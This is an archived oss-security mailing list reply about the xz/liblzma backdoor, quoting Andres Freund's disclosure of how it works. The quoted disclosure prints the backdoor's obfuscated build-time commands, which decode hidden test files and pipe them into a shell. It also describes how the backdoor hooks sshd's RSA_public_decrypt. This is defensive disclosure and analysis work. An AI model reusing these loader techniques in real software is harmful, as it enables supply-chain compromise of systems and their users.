<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>oss-security - Re: backdoor in upstream xz/liblzma leading to ssh
 server compromise</title>

<link href="/style.css" type="text/css" rel="stylesheet">
<style type="text/css">
.calendar { text-align: center; }
.ccell { background: #ccc; width: 5ex; padding: 2px; }

.cal_brief { text-align: center; }
.cal_brief td:first-child { background: inherit; }
.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
.cal_big { text-align: center; padding: 0; margin: 0; }
.cal_big td { padding: 0 2px; }
.cal_mon { text-align: center; }
.cal_mon th { font-size: small; padding: 0; margin: 0; }
.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
	padding: 2px; text-align: right; }
.cal_mon td[colspan] { background: inherit; }
.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
	margin-top: -2pt; font-weight: bold; }
.cal_mon a { text-align: right; margin-left: -4em; float: right; }
</style>
</head>

<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">


<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>

<td>
<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
<td width="100%">
<div class="nav">
<ul>
<li><a href="/">Products</a>
<ul>
<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
<ul>
<li><a href="/john/">Free &amp; Open Source for any platform</a>
<li><a href="/john/cloud/">in the cloud</a>
<li><a href="/john/pro/linux/">Pro for Linux</a>
<li><a href="/john/pro/macosx/">Pro for macOS</a>
</ul>
<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
<ul>
<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
</ul>
<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
<li><a href="/pam/">Pluggable Authentication Modules</a>
<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
</ul>
<li><a href="/services/">Services</a>
<li id="narrow-li-1"><a>Publications</a>
<ul>
<li><a href="/articles/">Articles</a>
<li><a href="/presentations/">Presentations</a>
</ul>
<li><a>Resources</a>
<ul>
<li><a href="/lists/">Mailing lists</a>
<li><a href="https://openwall.info/wiki/">Community wiki</a>
<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
<li><a href="https://cvsweb.openwall.com">Source code repositories (CVSweb)</a>
<li><a href="/mirrors/">File archive &amp; mirrors</a>
<li><a href="/signatures/">How to verify digital signatures</a>
<li><a href="/ove/">OVE IDs</a>
</ul>
<li id="last-li"><a href="/news">What's new</a>
</ul>
</div>


</table>


<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
<TR><TD>
<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
<TR><TD bgcolor="#ECF8FF">
<a href="https://hashsuite.openwall.net">
Hash Suite - Windows password security audit tool. GUI, reports in PDF.</a>

</TABLE>
</TABLE>

<a href="7">[&lt;prev]</a> <a href="9">[next&gt;]</a> <a href="6">[&lt;thread-prev]</a> <a href="9">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
<pre style="white-space: pre-wrap">
Message-ID: &lt;CA+aC4ku4Gkk3m0OHTr8nveHuxhW1bbh5GniaGxC_ahLMFm0k+g&#64;mail.gmail.com&gt;
Date: Fri, 29 Mar 2024 09:28:58 -0700
From: Anthony Liguori &lt;anthony&#64;...emonkey.ws&gt;
To: oss-security&#64;...ts.openwall.com
Subject: Re: backdoor in upstream xz/liblzma leading to ssh
 server compromise

I would not trust any content from tukanni.org including older tarballs.

The malicious individual has access to the signing key clearly and could
modify older tarballs easily.

Regards,

Anthony Liguori

On Fri, Mar 29, 2024, 9:18 AM Alex Gaynor &lt;alex.gaynor&#64;...il.com&gt; wrote:

&gt; Hi Andres,
&gt;
&gt; Thanks for writing this up. Just to make sure I understand the action
&gt; item here: folks who are building their own xz, should switch to a
&gt; release prior to 5.6.0, as those are the only ones known to be
&gt; unaffected?
&gt;
&gt; Alex
&gt;
&gt; On Fri, Mar 29, 2024 at 12:10 PM Andres Freund &lt;andres&#64;...razel.de&gt; wrote:
&gt; &gt;
&gt; &gt; Hi,
&gt; &gt;
&gt; &gt; After observing a few odd symptoms around liblzma (part of the xz
&gt; package) on
&gt; &gt; Debian sid installations over the last weeks (logins with ssh taking a
&gt; lot of
&gt; &gt; CPU, valgrind errors) I figured out the answer:
&gt; &gt;
&gt; &gt; The upstream xz repository and the xz tarballs have been backdoored.
&gt; &gt;
&gt; &gt; At first I thought this was a compromise of debian's package, but it
&gt; turns out
&gt; &gt; to be upstream.
&gt; &gt;
&gt; &gt;
&gt; &gt; == Compromised Release Tarball ==
&gt; &gt;
&gt; &gt; One portion of the backdoor is *solely in the distributed tarballs*. For
&gt; &gt; easier reference, here's a link to debian's import of the tarball, but
&gt; it is
&gt; &gt; also present in the tarballs for 5.6.0 and 5.6.1:
&gt; &gt;
&gt; &gt;
&gt; <a href="https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63" rel="nofollow">https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63</a>
&gt; &gt;
&gt; &gt; That line is *not* in the upstream source of build-to-host, nor is
&gt; &gt; build-to-host used by xz in git.  However, it is present in the tarballs
&gt; &gt; released upstream, except for the "source code" links, which I think
&gt; github
&gt; &gt; generates directly from the repository contents:
&gt; &gt;
&gt; &gt; <a href="https://github.com/tukaani-project/xz/releases/tag/v5.6.0" rel="nofollow">https://github.com/tukaani-project/xz/releases/tag/v5.6.0</a>
&gt; &gt; <a href="https://github.com/tukaani-project/xz/releases/tag/v5.6.1" rel="nofollow">https://github.com/tukaani-project/xz/releases/tag/v5.6.1</a>
&gt; &gt;
&gt; &gt;
&gt; &gt; This injects an obfuscated script to be executed at the end of
&gt; configure. This
&gt; &gt; script is fairly obfuscated and data from "test" .xz files in the
&gt; repository.
&gt; &gt;
&gt; &gt;
&gt; &gt; This script is executed and, if some preconditions match, modifies
&gt; &gt; $builddir/src/liblzma/Makefile to contain
&gt; &gt;
&gt; &gt; am__test = bad-3-corrupt_lzma2.xz
&gt; &gt; ...
&gt; &gt; am__test_dir=$(top_srcdir)/tests/files/$(am__test)
&gt; &gt; ...
&gt; &gt; sed rpath $(am__test_dir) | $(am__dist_setup) &gt;/dev/null 2&gt;&amp;1
&gt; &gt;
&gt; &gt;
&gt; &gt; which ends up as
&gt; &gt; ...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "
&gt; \-_" "         _\-" | xz -d | /bin/bash &gt;/dev/null 2&gt;&amp;1; ...
&gt; &gt;
&gt; &gt; Leaving out the "| bash" that produces
&gt; &gt;
&gt; &gt; ####Hello####
&gt; &gt; #��Z�.hj�
&gt; &gt; eval `grep ^srcdir= config.status`
&gt; &gt; if test -f ../../config.status;then
&gt; &gt; eval `grep ^srcdir= ../../config.status`
&gt; &gt; srcdir="../../$srcdir"
&gt; &gt; fi
&gt; &gt; export i="((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024
&gt; &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048
&gt; &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024
&gt; &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048
&gt; &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024
&gt; &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048
&gt; &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024
&gt; &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048
&gt; &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024
&gt; &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048
&gt; &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024
&gt; &gt;/dev/null) &amp;&amp; head -c +724)";(xz -dc
&gt; $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr
&gt; "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw
&gt; --lzma1 -dc|/bin/sh
&gt; &gt; ####World####
&gt; &gt;
&gt; &gt; After de-obfuscation this leads to the attached injected.txt.
&gt; &gt;
&gt; &gt;
&gt; &gt; == Compromised Repository ==
&gt; &gt;
&gt; &gt; The files containing the bulk of the exploit are in an obfuscated form in
&gt; &gt;   tests/files/bad-3-corrupt_lzma2.xz
&gt; &gt;   tests/files/good-large_compressed.lzma
&gt; &gt; committed upstream. They were initially added in
&gt; &gt;
&gt; <a href="https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0" rel="nofollow">https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0</a>
&gt; &gt;
&gt; &gt; Note that the files were not even used for any "tests" in 5.6.0.
&gt; &gt;
&gt; &gt;
&gt; &gt; Subsequently the injected code (more about that below) caused valgrind
&gt; errors
&gt; &gt; and crashes in some configurations, due the stack layout differing from
&gt; what
&gt; &gt; the backdoor was expecting.  These issues were attempted to be worked
&gt; around
&gt; &gt; in 5.6.1:
&gt; &gt;
&gt; &gt;
&gt; <a href="https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad" rel="nofollow">https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad</a>
&gt; &gt;
&gt; <a href="https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f" rel="nofollow">https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f</a>
&gt; &gt;
&gt; <a href="https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92" rel="nofollow">https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92</a>
&gt; &gt;
&gt; &gt; For which the exploit code was then adjusted:
&gt; &gt;
&gt; <a href="https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89" rel="nofollow">https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89</a>
&gt; &gt;
&gt; &gt; Given the activity over several weeks, the committer is either directly
&gt; &gt; involved or there was some quite severe compromise of their
&gt; &gt; system. Unfortunately the latter looks like the less likely explanation,
&gt; given
&gt; &gt; they communicated on various lists about the "fixes" mentioned above.
&gt; &gt;
&gt; &gt;
&gt; &gt; Florian Weimer first extracted the injected code in isolation, also
&gt; attached,
&gt; &gt; liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!
&gt; &gt;
&gt; &gt;
&gt; &gt; == Affected Systems ==
&gt; &gt;
&gt; &gt; The attached de-obfuscated script is invoked first after configure,
&gt; where it
&gt; &gt; decides whether to modify the build process to inject the code.
&gt; &gt;
&gt; &gt; These conditions include targeting only x86-64 linux:
&gt; &gt;     if ! (echo "$build" | grep -Eq "^x86_64" &gt; /dev/null 2&gt;&amp;1) &amp;&amp; (echo
&gt; "$build" | grep -Eq "linux-gnu$" &gt; /dev/null 2&gt;&amp;1);then
&gt; &gt;
&gt; &gt; Building with gcc and the gnu linker
&gt; &gt;     if test "x$GCC" != 'xyes' &gt; /dev/null 2&gt;&amp;1;then
&gt; &gt;     exit 0
&gt; &gt;     fi
&gt; &gt;     if test "x$CC" != 'xgcc' &gt; /dev/null 2&gt;&amp;1;then
&gt; &gt;     exit 0
&gt; &gt;     fi
&gt; &gt;     LDv=$LD" -v"
&gt; &gt;     if ! $LDv 2&gt;&amp;1 | grep -qs 'GNU ld' &gt; /dev/null 2&gt;&amp;1;then
&gt; &gt;     exit 0
&gt; &gt;
&gt; &gt; Running as part of a debian or RPM package build:
&gt; &gt;     if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" =
&gt; "xx86_64";then
&gt; &gt;
&gt; &gt; Particularly the latter is likely aimed at making it harder to reproduce
&gt; the
&gt; &gt; issue for investigators.
&gt; &gt;
&gt; &gt;
&gt; &gt; Due to the working of the injected code (see below), it is likely the
&gt; backdoor
&gt; &gt; can only work on glibc based systems.
&gt; &gt;
&gt; &gt;
&gt; &gt; Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux
&gt; &gt; distributions, and where they have, mostly in pre-release versions.
&gt; &gt;
&gt; &gt;
&gt; &gt; == Observing Impact on openssh server ==
&gt; &gt;
&gt; &gt; With the backdoored liblzma installed, logins via ssh become a lot
&gt; slower.
&gt; &gt;
&gt; &gt; time ssh nonexistant&#64;...alhost
&gt; &gt;
&gt; &gt; before:
&gt; &gt; nonexistant&#64;...alhost: Permission denied (publickey).
&gt; &gt;
&gt; &gt; before:
&gt; &gt; real    0m0.299s
&gt; &gt; user    0m0.202s
&gt; &gt; sys     0m0.006s
&gt; &gt;
&gt; &gt; after:
&gt; &gt; nonexistant&#64;...alhost: Permission denied (publickey).
&gt; &gt;
&gt; &gt; real    0m0.807s
&gt; &gt; user    0m0.202s
&gt; &gt; sys     0m0.006s
&gt; &gt;
&gt; &gt;
&gt; &gt; openssh does not directly use liblzma. However debian and several other
&gt; &gt; distributions patch openssh to support systemd notification, and
&gt; libsystemd
&gt; &gt; does depend on lzma.
&gt; &gt;
&gt; &gt;
&gt; &gt; Initially starting sshd outside of systemd did not show the slowdown,
&gt; despite
&gt; &gt; the backdoor briefly getting invoked. This appears to be part of some
&gt; &gt; countermeasures to make analysis harder.
&gt; &gt;
&gt; &gt; Observed requirements for the exploit:
&gt; &gt; a) TERM environment variable is not set
&gt; &gt; b) argv[0] needs to be /usr/sbin/sshd
&gt; &gt; c) LD_DEBUG, LD_PROFILE are not set
&gt; &gt; d) LANG needs to be set
&gt; &gt; e) Some debugging environments, like rr, appear to be detected. Plain gdb
&gt; &gt;    appears to be detected in some situations, but not others
&gt; &gt;
&gt; &gt; To reproduce outside of systemd, the server can be started with a clear
&gt; &gt; environment, setting only the required variable:
&gt; &gt;
&gt; &gt; env -i LANG=en_US.UTF-8 /usr/sbin/sshd -D
&gt; &gt;
&gt; &gt;
&gt; &gt; In fact, openssh does not need to be started as a server to observe the
&gt; &gt; slowdown:
&gt; &gt;
&gt; &gt; slow:
&gt; &gt; env -i LANG=C /usr/sbin/sshd -h
&gt; &gt;
&gt; &gt; (about 0.5s on my older system)
&gt; &gt;
&gt; &gt;
&gt; &gt; fast:
&gt; &gt; env -i LANG=C TERM=foo /usr/sbin/sshd -h
&gt; &gt; env -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
&gt; &gt; ...
&gt; &gt;
&gt; &gt; (about 0.01s on the same system)
&gt; &gt;
&gt; &gt;
&gt; &gt; It's possible that argv[0] other /usr/sbin/sshd also would have effect -
&gt; there
&gt; &gt; are obviously lots of servers linking to libsystemd.
&gt; &gt;
&gt; &gt;
&gt; &gt; == Analyzing the injected code ==
&gt; &gt;
&gt; &gt; I am *not* a security researcher, nor a reverse engineer.  There's lots
&gt; of
&gt; &gt; stuff I have not analyzed and most of what I observed is purely from
&gt; &gt; observation rather than exhaustively analyzing the backdoor code.
&gt; &gt;
&gt; &gt; To analyze I primarily used "perf record -e intel_pt//ub" to observe
&gt; where
&gt; &gt; execution diverges between the backdoor being active and not. Then also
&gt; gdb,
&gt; &gt; setting breakpoints before the divergence.
&gt; &gt;
&gt; &gt;
&gt; &gt; The backdoor initially intercepts execution by replacing the ifunc
&gt; resolvers
&gt; &gt; crc32_resolve(), crc64_resolve() with different code, which calls
&gt; &gt; _get_cpuid(), injected into the code (which previously would just be
&gt; static
&gt; &gt; inline functions).  In xz 5.6.1 the backdoor was further obfuscated,
&gt; removing
&gt; &gt; symbol names.
&gt; &gt;
&gt; &gt; These functions get resolved during startup, because sshd is built with
&gt; &gt; -Wl,-z,now, leading to all symbols being resolved early. If started with
&gt; &gt; LD_BIND_NOT=1 the backdoor does not appear to work.
&gt; &gt;
&gt; &gt;
&gt; &gt; Below crc32_resolve() _get_cpuid() does not do much, it just sees that a
&gt; &gt; 'completed' variable is 0 and increments it, returning the normal cpuid
&gt; result
&gt; &gt; (via a new _cpuid()). It gets to be more interesting during
&gt; crc64_resolve().
&gt; &gt;
&gt; &gt; In the second invocation crc64_resolve() appears to find various
&gt; information,
&gt; &gt; like data from the dynamic linker, program arguments and environment.
&gt; Then it
&gt; &gt; perform various environment checks, including those above. There are
&gt; other
&gt; &gt; checks I have not fully traced.
&gt; &gt;
&gt; &gt; If the above decides to continue, the code appears to be parsing the
&gt; symbol
&gt; &gt; tables in memory. This is the quite slow step that made me look into the
&gt; issue.
&gt; &gt;
&gt; &gt;
&gt; &gt; Notably liblzma's symbols are resolved before many of the other
&gt; libraries,
&gt; &gt; including the symbols in the main sshd binary.  This is important because
&gt; &gt; symbols are resolved, the GOT gets remapped read-only thanks to
&gt; -Wl,-z,relro.
&gt; &gt;
&gt; &gt;
&gt; &gt; To be able to resolve symbols in libraries that have not yet loaded, the
&gt; &gt; backdoor installs an audit hook into the dynamic linker, which can be
&gt; observed
&gt; &gt; with gdb using
&gt; &gt;   watch _rtld_global_ro._dl_naudit
&gt; &gt; It looks like the audit hook is only installed for the main binary.
&gt; &gt;
&gt; &gt; That hook gets called, from _dl_audit_symbind, for numerous symbols in
&gt; the
&gt; &gt; main binary. It appears to wait for "RSA_public_decrypt&#64;....plt" to be
&gt; &gt; resolved.  When called for that symbol, the backdoor changes the value of
&gt; &gt; RSA_public_decrypt&#64;....plt to point to its own code.  It does not do
&gt; this via
&gt; &gt; the audit hook mechanism, but outside of it.
&gt; &gt;
&gt; &gt; For reasons I do not yet understand, it does change sym.st_value *and*
&gt; the
&gt; &gt; return value of from the audit hook to a different value, which leads
&gt; &gt; _dl_audit_symbind() to do nothing - why change anything at all then?
&gt; &gt;
&gt; &gt; After that the audit hook is uninstalled again.
&gt; &gt;
&gt; &gt; It is possible to change the got.plt contents at this stage because it
&gt; has not
&gt; &gt; (and can't yet) been remapped to be read-only.
&gt; &gt;
&gt; &gt;
&gt; &gt; I suspect there might be further changes performed at this stage.
&gt; &gt;
&gt; &gt;
&gt; &gt; == Impact on sshd ==
&gt; &gt;
&gt; &gt; The prior section explains that RSA_public_decrypt&#64;....plt was
&gt; redirected to
&gt; &gt; point into the backdoor code. The trace I was analyzing indeed shows that
&gt; &gt; during a pubkey login the exploit code is invoked:
&gt; &gt;
&gt; &gt;             sshd 1736357 [010] 714318.734008:          1  branches:uH:
&gt;     5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =&gt;     5555555612d0
&gt; RSA_public_decrypt&#64;...+0x0 (/usr/sbin/sshd)
&gt; &gt;
&gt; &gt; The backdoor then calls back into libcrypto, presumably to perform
&gt; normal authentication
&gt; &gt;
&gt; &gt;             sshd 1736357 [010] 714318.734009:          1  branches:uH:
&gt;     7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =&gt;
&gt;    7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)
&gt; &gt;
&gt; &gt;
&gt; &gt; I have not yet analyzed precisely what is being checked for in the
&gt; injected
&gt; &gt; code, to allow unauthorized access. Since this is running in a
&gt; &gt; pre-authentication context, it seems likely to allow some form of access
&gt; or
&gt; &gt; other form of remote code execution.
&gt; &gt;
&gt; &gt; I'd upgrade any potentially vulnerable system ASAP.
&gt; &gt;
&gt; &gt;
&gt; &gt; == Bug reports ==
&gt; &gt;
&gt; &gt; Given the apparent upstream involvement I have not reported an upstream
&gt; &gt; bug. As I initially thought it was a debian specific issue, I sent a more
&gt; &gt; preliminary report to security&#64;...ian.org.  Subsequently I reported the
&gt; issue
&gt; &gt; to distros@. CISA was notified by a distribution.
&gt; &gt;
&gt; &gt; Red Hat assigned this issue CVE-2024-3094.
&gt; &gt;
&gt; &gt;
&gt; &gt; == Detecting if installation is vulnerable ==
&gt; &gt;
&gt; &gt; Vegard Nossum wrote a script to detect if it's likely that the ssh
&gt; binary on a
&gt; &gt; system is vulnerable, attached here. Thanks!
&gt; &gt;
&gt; &gt;
&gt; &gt; Greetings,
&gt; &gt;
&gt; &gt; Andres Freund
&gt;
&gt;
&gt;
&gt; --
&gt; All that is necessary for evil to succeed is for good people to do nothing.
&gt;

</pre>
<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>


<p>
Please check out the
<a href="https://oss-security.openwall.org/wiki/">
Open Source Software Security Wiki</a>, which is counterpart to this
<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
<p>
Confused about <a href="/lists/">mailing lists</a> and their use?
<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
and check out these
<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
<p>

</body>
</html>
